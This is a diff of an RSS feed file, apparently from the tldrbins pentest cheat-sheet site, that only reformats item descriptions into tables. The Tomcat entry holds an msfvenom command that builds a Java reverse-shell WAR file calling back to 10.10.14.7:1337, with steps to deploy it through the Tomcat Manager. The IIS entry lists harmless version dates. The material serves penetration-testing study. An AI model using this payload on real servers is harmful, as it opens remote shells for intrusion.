@@ -19,14 +19,14 @@
       <link>https://tldrbins.github.io/apache_tomcat/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/apache_tomcat/</guid>
-      <description> RCE (Authenicated) # Create a malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1337 -f war -o revshell.war # 1. Login to Tomcat Web Application Manager # 2. WAR file to deploy -&amp;gt; Deploy # 3. Click /revshell in Applications table </description>
+      <description> RCE (Authenicated) # Create malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1337 -f war -o revshell.war +------------------------------------------+ |Exploit | +------------------------------------------+ |1. Login to Tomcat Web Application Manager| |2. WAR file to deploy -&amp;gt; Deploy | |3. Click /revshell in Applications table | +------------------------------------------+ </description>
     </item>
     <item>
       <title>IIS</title>
       <link>https://tldrbins.github.io/iis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/iis/</guid>
-      <description>IIS Version Version Start Date End Date IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027 IIS 10 on Windows 10 Pro Jul 29, 2015 IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 IIS 8.5 on Windows Server 2012 R2 Nov 25, 2013 Oct 10, 2023 IIS 8.</description>
+      <description>IIS Version +-------------------------------------------------------------------------------+ |Version Start Date End Date | +-------------------------------------------------------------------------------+ |IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 | |IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 | |IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027| |IIS 10 on Windows 10 Pro Jul 29, 2015 | |IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 | |IIS 8.</description>
     </item>
   </channel>
 </rss>
